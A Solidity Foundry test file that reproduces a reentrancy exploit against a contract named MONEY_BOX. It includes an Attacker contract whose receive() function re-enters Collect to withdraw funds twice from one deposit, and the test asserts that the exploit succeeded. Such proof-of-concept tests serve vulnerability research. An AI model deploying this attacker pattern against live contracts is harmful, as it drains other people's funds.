
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The Collect function requires:
        // - acc.balance >= MinSum (1 ether)
        // - acc.balance >= _am
        // - block.timestamp > acc.unlockTime

        // --- 3. Funding ---
        // Fund the Victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to bypass the unlockTime check
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = MONEY_BOX(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the MONEY_BOX with 0 lockTime
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 0;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // If we received more than we deposited, the attack succeeded
        // Due to reentrancy, we should have withdrawn 'val' twice but only had 'val' deposited
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the Collect function before balance is updated
            victim.Collect(storedAttackVal);
        }
    }
}
